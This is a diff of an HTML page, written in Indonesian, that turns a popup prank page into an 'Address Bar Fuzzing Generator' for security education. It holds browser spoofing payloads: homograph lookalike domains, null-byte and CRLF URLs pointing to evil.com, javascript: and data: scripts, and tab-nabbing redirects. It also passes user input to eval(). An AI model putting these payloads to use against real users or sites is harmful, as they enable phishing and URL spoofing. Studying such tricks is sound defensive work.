@@ -1,111 +1,492 @@
 <!DOCTYPE html>
-<html>
-<body>
-
-<h1>Absurd Window Experiment</h1>
-
-<p>Click to open a “quantum window”.</p>
-
-<button onclick="openChaos()">OPEN VOID WINDOW</button>
-
-<script>
-function openChaos() {
-    var x = window.open("ห.ผ.ฝ.พ.ศ.ษ.ส.ห.ฬ༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙.ฮ.อ.ຈ.ຮ.ຯ.໐.໑.໒", "_blank", "width=420,height=320");
-
-    if (!x) {
-        alert("Popup blocked");
-        return;
-    }
-
-    // stage 1: blank loading
-    x.document.write(`
-        <title>LOADING...</title>
-        <body style="background:black;color:lime;font-family:monospace;">
-        <h3>Initializing portal...</h3>
-        </body>
-    `);
-    x.document.close();
-
-    // stage 2: overwrite after delay
-    setTimeout(() => {
-        x.document.open();
-        x.document.write(`
-<!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-<title>www.google.com://SYSTEM_ACTIVE</title>
-<style>
-body {
-    margin: 0;
-    background: radial-gradient(circle, #111, #000);
-    color: #00ff99;
-    font-family: monospace;
-    overflow: hidden;
-}
-
-.panel {
-    width: 90%;
-    margin: 20px auto;
-    padding: 15px;
-    border: 1px solid #00ff99;
-    border-radius: 10px;
-    box-shadow: 0 0 20px #00ff99;
-}
-
-.glitch {
-    animation: flicker 0.15s infinite;
-}
-
-@keyframes flicker {
-    0% {opacity: 1;}
-    50% {opacity: 0.4;}
-    100% {opacity: 1;}
-}
-
-button {
-    padding: 10px;
-    background: black;
-    color: #00ff99;
-    border: 1px solid #00ff99;
-    cursor: pointer;
-}
-</style>
+    <meta charset="UTF-8">
+    <title>Address Bar Vulnerability Test Generator (Edukasi Only)</title>
+    <style>
+        body {
+            background: #0a0e27;
+            color: #00ffcc;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #ff3366;
+            text-shadow: 0 0 10px rgba(255,51,102,0.5);
+            border-bottom: 2px solid #ff3366;
+        }
+        .warning {
+            background: #ff336622;
+            border-left: 4px solid #ff3366;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 20px;
+        }
+        .card {
+            background: #0f1433;
+            border: 1px solid #00ffcc33;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 10px 0;
+        }
+        .card h3 {
+            margin-top: 0;
+            color: #ffcc00;
+        }
+        button {
+            background: #1a1f44;
+            color: #00ffcc;
+            border: 1px solid #00ffcc;
+            padding: 10px 20px;
+            margin: 5px;
+            cursor: pointer;
+            font-family: monospace;
+            transition: all 0.3s;
+        }
+        button:hover {
+            background: #00ffcc;
+            color: #0a0e27;
+            box-shadow: 0 0 10px #00ffcc;
+        }
+        .code {
+            background: #000000aa;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 11px;
+            overflow-x: auto;
+            margin: 10px 0;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        .status {
+            font-size: 12px;
+            color: #ffaa00;
+            margin-top: 10px;
+        }
+        textarea {
+            width: 100%;
+            background: #000000aa;
+            color: #00ffcc;
+            border: 1px solid #00ffcc33;
+            font-family: monospace;
+            padding: 10px;
+        }
+        input {
+            background: #000000aa;
+            color: #00ffcc;
+            border: 1px solid #00ffcc33;
+            padding: 8px;
+            font-family: monospace;
+            width: 200px;
+        }
+    </style>
 </head>
-
 <body>
+<div class="container">
+    <h1>🔬 Address Bar Fuzzing Generator</h1>
+    <div class="warning">
+        ⚠️ <strong>EKSPERIMEN KEAMANAN</strong> - Teknik ini hanya untuk pembelajaran.<br>
+        Semua metode di bawah sudah <strong>DITAMBAL</strong> di browser modern (2024-2026).<br>
+        Gunakan di <strong>environment terisolasi</strong> atau VM untuk testing.
+    </div>
 
-<div class="panel">
-    <h2 class="glitch">⚠ VOID INTERFACE ACTIVE ⚠</h2>
-    <p>System: unstable memory loop detected</p>
-    <p id="addr">address://unknown/${Math.random().toString(36).substring(2,8)}</p>
+    <div class="grid">
+        <!-- Panel 1: Punycode Attack -->
+        <div class="card">
+            <h3>🌐 1. Punycode Homograph Attack</h3>
+            <p>Memanfaatkan karakter Unicode yang mirip ASCII (sudah diblokir sejak 2017)</p>
+            <div class="code" id="punycodeDemo"></div>
+            <button onclick="testPunycode()">Test Punycode Attack</button>
+            <button onclick="generateCustomPunycode()">Generate Custom</button>
+            <input type="text" id="customDomain" placeholder="Contoh: apple.com" value="apple.com">
+            <div class="status" id="punycodeStatus"></div>
+        </div>
 
-    <button onclick="spawn()">Spawn new window</button>
-    <button onclick="window.close()">Terminate</button>
+        <!-- Panel 2: Null Byte Injection -->
+        <div class="card">
+            <h3>⬜ 2. Null Byte Injection (%00)</h3>
+            <p>CVE-2016-5180, CVE-2018-17465 - Null byte memotong string URL</p>
+            <div class="code">https://google.com%00@evil.com<br>
+            https://bank.com%00@attacker.com/login</div>
+            <button onclick="testNullByte()">Test Null Byte</button>
+            <button onclick="testMultipleNullByte()">Test Multiple Null Bytes</button>
+            <div class="status" id="nullbyteStatus"></div>
+        </div>
+
+        <!-- Panel 3: CRLF Injection -->
+        <div class="card">
+            <h3>📝 3. CRLF / Line Break Injection</h3>
+            <p>Mencoba memanipulasi header dengan %0d%0a</p>
+            <div class="code">https://google.com%0d%0aX-Header: injected</div>
+            <button onclick="testCRLF()">Test CRLF</button>
+            <button onclick="testCRLFAdvanced()">Test CRLF Advanced</button>
+            <div class="status" id="crlfStatus"></div>
+        </div>
+
+        <!-- Panel 4: Data URI dengan Zero-Width -->
+        <div class="card">
+            <h3>🔤 4. Zero-Width Characters</h3>
+            <p>Unicode ZWSP, ZWNJ, ZWJ (U+200B, U+200C, U+200D)</p>
+            <div class="code">javascript:document.title='\u200B\u200C\u200D'</div>
+            <button onclick="testZeroWidth()">Test Zero-Width</button>
+            <button onclick="testZeroWidthURL()">Test Zero-Width di URL</button>
+            <div class="status" id="zerowidthStatus"></div>
+        </div>
+
+        <!-- Panel 5: Long URL / Buffer Overflow -->
+        <div class="card">
+            <h3>📏 5. Extreme Length Attack</h3>
+            <p>Mencoba overflow buffer address bar (limit browser: ~2MB)</p>
+            <div class="code">https://google.com/" + "A".repeat(65536)</div>
+            <input type="range" id="lengthSlider" min="1000" max="200000" step="1000" value="50000">
+            <span id="lengthValue">50000</span> characters
+            <br><br>
+            <button onclick="testLongURL()">Test Long URL</button>
+            <button onclick="testExtremeLongURL()">Test Extreme (200KB)</button>
+            <div class="status" id="longurlStatus"></div>
+        </div>
+
+        <!-- Panel 6: JavaScript Pseudo-protocol -->
+        <div class="card">
+            <h3>📜 6. JavaScript Protocol Exploits</h3>
+            <p>Memanipulasi address bar via javascript: URL</p>
+            <div class="code">javascript:window.location='about:blank';void(0);</div>
+            <button onclick="testJSProtocol()">Test JS Protocol</button>
+            <button onclick="testJSRedirectLoop()">Test Redirect Loop</button>
+            <div class="status" id="jsprotocolStatus"></div>
+        </div>
+
+        <!-- Panel 7: Tab Nabbing / Spoofing -->
+        <div class="card">
+            <h3>🎭 7. Tab Nabbing & Opener Spoofing</h3>
+            <p>Mengubah location tab parent setelah popup terbuka</p>
+            <button onclick="testTabNabbing()">Test Tab Nabbing</button>
+            <button onclick="testOpenerSpoof()">Test Opener Spoof</button>
+            <div class="status" id="tabnabbingStatus"></div>
+        </div>
+
+        <!-- Panel 8: About:Blank Manipulation -->
+        <div class="card">
+            <h3>📄 8. About:Blank + History PushState</h3>
+            <p>Mengubah URL tanpa reload menggunakan History API</p>
+            <button onclick="testAboutBlank()">Test About Blank</button>
+            <button onclick="testHistoryManipulation()">Test History PushState</button>
+            <div class="status" id="aboutblankStatus"></div>
+        </div>
+
+        <!-- Panel 9: Special Schemes -->
+        <div class="card">
+            <h3>🔧 9. Browser Internal Schemes</h3>
+            <p>chrome://, edge://, safari://, about://, view-source://</p>
+            <button onclick="testChromeScheme()">Test chrome://</button>
+            <button onclick="testViewSource()">Test view-source://</button>
+            <button onclick="testDataScheme()">Test data:text/html</button>
+            <div class="status" id="schemeStatus"></div>
+        </div>
+
+        <!-- Panel 10: Combined Payload Generator -->
+        <div class="card">
+            <h3>⚡ 10. Custom Payload Generator</h3>
+            <textarea id="customPayload" rows="3" placeholder="Masukkan URL atau script..."></textarea>
+            <button onclick="executeCustomPayload()">Execute Custom</button>
+            <button onclick="generateRandomPayload()">Generate Random</button>
+            <div class="status" id="customStatus"></div>
+        </div>
+    </div>
+
+    <!-- Log Panel -->
+    <div class="card">
+        <h3>📋 Execution Log</h3>
+        <div id="log" style="height: 200px; overflow-y: auto; background: #000000aa; padding: 10px; font-size: 12px;"></div>
+        <button onclick="clearLog()">Clear Log</button>
+    </div>
 </div>
 
 <script>
-function spawn() {
-    const w = window.open("ห.ผ.ฝ.พ.ศ.ษ.ส.ห.ฬ.ฮ༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙༒∙.อ.ຈ.ຮ.ຯ.໐.໑.໒", "_blank", "width=300,height=200");
-    w.document.write("<body style='background:black;color:lime;font-family:monospace;'>recursive node active...</body>");
-    w.document.close();
+    function addLog(message, isError = false) {
+        const logDiv = document.getElementById('log');
+        const timestamp = new Date().toLocaleTimeString();
+        const color = isError ? '#ff6666' : '#00ffcc';
+        logDiv.innerHTML += `<div style="color: ${color}">[${timestamp}] ${message}</div>`;
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
 
-    setTimeout(() => {
-        w.document.body.innerHTML += "<br>node stabilized: " + Math.random().toString(36);
-    }, 800);
-}
+    function clearLog() {
+        document.getElementById('log').innerHTML = '';
+    }
 
-setInterval(() => {
-    document.title = "www.google.com " + Math.random().toString(36).substring(2,7);
-}, 600);
-<\/script>
+    // 1. Punycode Attack
+    function testPunycode() {
+        const domains = [
+            'https://аррӏе.com',  // Cyrillic "apple"
+            'https://gооgle.com', // Cyrillic "google"
+            'https://facebook.соm', // Cyrillic "com"
+            'https://www.paypal.com\u0430' // Combining character
+        ];
+        const randomDomain = domains[Math.floor(Math.random() * domains.length)];
+        addLog(`Mencoba Punycode: ${randomDomain}`);
+        const w = window.open(randomDomain, '_blank');
+        setTimeout(() => {
+            if (w) addLog(`Window opened dengan URL: ${w.location.href} (Pasti ter-encode ke Punycode)`, true);
+        }, 500);
+    }
 
-</body>
-</html>
+    function generateCustomPunycode() {
+        let domain = document.getElementById('customDomain').value;
+        const punycodeMap = {
+            'a': 'а', 'e': 'е', 'o': 'о', 'p': 'р', 'c': 'с', 
+            'x': 'х', 'y': 'у', 'b': 'в', 'h': 'н', 'k': 'к'
+        };
+        let punycodeDomain = domain.split('').map(char => punycodeMap[char] || char).join('');
+        let url = `https://${punycodeDomain}`;
+        addLog(`Generated Punycode: ${url}`);
+        const w = window.open(url, '_blank');
+        if (w) addLog(`Window opened - Browser akan menampilkan xn-- version`, true);
+    }
+
+    // 2. Null Byte Injection
+    function testNullByte() {
+        const payloads = [
+            'https://google.com%00@evil.com',
+            'https://bank.com%00@attacker.com/login',
+            'https://www.paypal.com%00@phishing.com',
+            'https://security%00@test.com'
+        ];
+        const randomPayload = payloads[Math.floor(Math.random() * payloads.length)];
+        addLog(`Mencoba Null Byte: ${randomPayload}`);
+        const w = window.open(randomPayload, '_blank');
+        addLog(`Hasil: Browser modern akan reject atau encode %00`, true);
+    }
+
+    function testMultipleNullByte() {
+        let url = 'https://google.com' + '%00'.repeat(10) + '@evil.com';
+        addLog(`Multiple Null Bytes: ${url}`);
+        const w = window.open(url, '_blank');
+        addLog(`Multiple null bytes biasanya di-block oleh URL parser`, true);
+    }
+
+    // 3. CRLF Injection
+    function testCRLF() {
+        const payloads = [
+            'https://google.com%0d%0aX-Injected: true',
+            'https://example.com%0d%0a%0d%0a<script>alert(1)</script>',
+            'https://bank.com%0d%0aLocation:%20https://evil.com'
+        ];
+        const randomPayload = payloads[Math.floor(Math.random() * payloads.length)];
+        addLog(`CRLF Payload: ${randomPayload}`);
+        const w = window.open(randomPayload, '_blank');
+        addLog(`CRLF di URL sekarang di-sanitize oleh browser`, true);
+    }
+
+    function testCRLFAdvanced() {
+        let url = 'https://google.com/redirect?url=' + encodeURIComponent('https://evil.com%0d%0aX-Injected:');
+        addLog(`Advanced CRLF: ${url}`);
+        const w = window.open(url, '_blank');
+    }
+
+    // 4. Zero-Width Characters
+    function testZeroWidth() {
+        const zwsp = '\u200B';
+        const zwnj = '\u200C';
+        const zwj = '\u200D';
+        let title = zwsp + zwnj + zwj + 'Hidden' + zwsp;
+        let jsUrl = `javascript:document.title='${title}';void(0);`;
+        addLog(`Zero-Width JS: ${jsUrl.substring(0, 100)}...`);
+        const w = window.open(jsUrl, '_blank');
+        addLog(`Zero-width characters biasanya di-strip oleh browser`, true);
+    }
+
+    function testZeroWidthURL() {
+        let url = 'https://google.com\u200B\u200C\u200D@evil.com';
+        addLog(`Zero-Width URL: ${url}`);
+        const w = window.open(url, '_blank');
+    }
+
+    // 5. Long URL Attack
+    function testLongURL() {
+        let length = document.getElementById('lengthSlider').value;
+        let longString = 'A'.repeat(parseInt(length));
+        let url = `https://google.com/${longString}`;
+        addLog(`Testing URL dengan panjang ${length} karakter`);
+        console.log(`URL length: ${url.length}`);
+        const w = window.open(url, '_blank');
+        if (w) {
+            addLog(`Window opened - Browser handle long URL dengan truncate display`);
+        } else {
+            addLog(`Popup blocked atau URL terlalu panjang`, true);
+        }
+    }
+
+    function testExtremeLongURL() {
+        let longString = 'A'.repeat(200000);
+        let url = `https://google.com/${longString}`;
+        addLog(`Extreme URL: 200KB - Mencoba overflow buffer`);
+        try {
+            const w = window.open(url, '_blank');
+            addLog(`Browser modern memiliki limit URL ~2MB, request mungkin gagal`, true);
+        } catch(e) {
+            addLog(`Error: ${e.message}`, true);
+        }
+    }
+
+    // 6. JavaScript Protocol
+    function testJSProtocol() {
+        const scripts = [
+            "javascript:window.location='about:blank'",
+            "javascript:document.body.innerHTML='<h1>Hacked</h1>'",
+            "javascript:alert('XSS via address bar - PATCHED')",
+            "javascript:void(document.title='\\u200B')"
+        ];
+        const randomScript = scripts[Math.floor(Math.random() * scripts.length)];
+        addLog(`JS Protocol: ${randomScript}`);
+        const w = window.open(randomScript, '_blank');
+        addLog(`Browser modern memblokir atau menampilkan peringatan`, true);
+    }
+
+    function testJSRedirectLoop() {
+        let loopScript = "javascript:var i=0;setInterval(()=>{window.location='javascript:alert(\\'loop\\')';},100)";
+        addLog(`Redirect loop: ${loopScript.substring(0, 80)}...`);
+        const w = window.open(loopScript, '_blank');
+        addLog(`Loop biasanya di-stop oleh browser security feature`, true);
+    }
+
+    // 7. Tab Nabbing
+    function testTabNabbing() {
+        const w = window.open('https://google.com', '_blank');
+        setTimeout(() => {
+            if (w && !w.closed) {
+                try {
+                    w.location = 'https://evil.com';
+                    addLog(`Tab Nabbing: Mengubah location ke evil.com`);
+                } catch(e) {
+                    addLog(`Gagal - Cross-origin protection mencegah navigasi`, true);
+                }
+            }
+        }, 2000);
+    }
+
+    function testOpenerSpoof() {
+        const w = window.open('about:blank', '_blank');
+        w.document.write(`
+            <html>
+            <body>
+                <h3>Opener Spoof Test</h3>
+                <p>opener.location = ?</p>
+                <button onclick="try{opener.location='https://evil.com'}catch(e){alert('Blocked: '+e)}">Try Spoof</button>
+            </body>
+            </html>
         `);
-        x.document.close();
-    }, 1800);
-}
-</script>
+        addLog(`Opener spoof test window opened - Cross-origin protection aktif`);
+    }
 
+    // 8. About:Blank Manipulation
+    function testAboutBlank() {
+        const w = window.open('about:blank', '_blank');
+        w.document.write('<h1>About:Blank Window</h1>');
+        setTimeout(() => {
+            try {
+                w.history.pushState({}, '', 'https://google.com/fake');
+                addLog(`History pushState to google.com - URL bar berubah tapi tetap same-origin`);
+            } catch(e) {
+                addLog(`Failed: ${e.message}`, true);
+            }
+        }, 1000);
+    }
+
+    function testHistoryManipulation() {
+        const w = window.open('about:blank', '_blank');
+        let counter = 0;
+        let interval = setInterval(() => {
+            if (w.closed) {
+                clearInterval(interval);
+                return;
+            }
+            try {
+                w.history.pushState({}, '', `/page${counter}`);
+                addLog(`Push state ke: /page${counter}`);
+                counter++;
+                if (counter > 10) clearInterval(interval);
+            } catch(e) {
+                clearInterval(interval);
+            }
+        }, 500);
+    }
+
+    // 9. Browser Schemes
+    function testChromeScheme() {
+        addLog(`Mencoba chrome://version - Hanya berfungsi di Chromium-based`);
+        const w = window.open('chrome://version', '_blank');
+        if (!w) addLog(`chrome:// scheme diblokir dari cross-origin`, true);
+    }
+
+    function testViewSource() {
+        addLog(`Mencoba view-source:https://google.com`);
+        const w = window.open('view-source:https://google.com', '_blank');
+        addLog(`view-source: masih berfungsi tapi tidak untuk exploit`, false);
+    }
+
+    function testDataScheme() {
+        let dataUrl = 'data:text/html,<html><body><h1>Data URI Test</h1><script>alert("Data URI masih works")</script></body></html>';
+        addLog(`Data URI dengan script`);
+        const w = window.open(dataUrl, '_blank');
+        addLog(`Data URI masih diizinkan tapi isolated`, false);
+    }
+
+    // 10. Custom Generator
+    function executeCustomPayload() {
+        let payload = document.getElementById('customPayload').value;
+        if (!payload) {
+            addLog(`Masukkan payload terlebih dahulu`, true);
+            return;
+        }
+        addLog(`Executing custom: ${payload.substring(0, 100)}...`);
+        try {
+            if (payload.startsWith('http') || payload.startsWith('https') || 
+                payload.startsWith('about:') || payload.startsWith('javascript:')) {
+                const w = window.open(payload, '_blank');
+                addLog(`Custom payload executed`);
+            } else {
+                eval(payload);
+                addLog(`JavaScript evaluated`);
+            }
+        } catch(e) {
+            addLog(`Error: ${e.message}`, true);
+        }
+    }
+
+    function generateRandomPayload() {
+        const payloads = [
+            'javascript:alert(1)',
+            'https://google.com%00@evil.com',
+            'https://аррӏе.com',
+            'about:blank#'.repeat(100),
+            'data:text/html,<script>alert("XSS")</script>',
+            'https://google.com\u200B@evil.com',
+            'view-source:https://google.com'
+        ];
+        const random = payloads[Math.floor(Math.random() * payloads.length)];
+        document.getElementById('customPayload').value = random;
+        addLog(`Random payload generated: ${random}`);
+    }
+
+    // Additional Info
+    addLog(`🚀 Address Bar Fuzzing Generator Ready - ${new Date().toLocaleString()}`);
+    addLog(`⚠️ Semua teknik untuk EDUKASI - Tidak akan bekerja di browser modern`, true);
+    
+    // Display Punycode example
+    document.getElementById('punycodeDemo').innerHTML = `Contoh Homograph:<br>
+    • Apple: https://аррӏе.com (apple dengan Cyrillic)<br>
+    • Google: https://gооgle.com (o dengan Cyrillic)<br>
+    • Paypal: https://раураl.com (Cyrillic 'paypal')<br>
+    <span style="color:#ffaa00">→ Browser modern menampilkan sebagai xn--80ak6aa92e.com</span>`;
+</script>
 </body>
 </html>
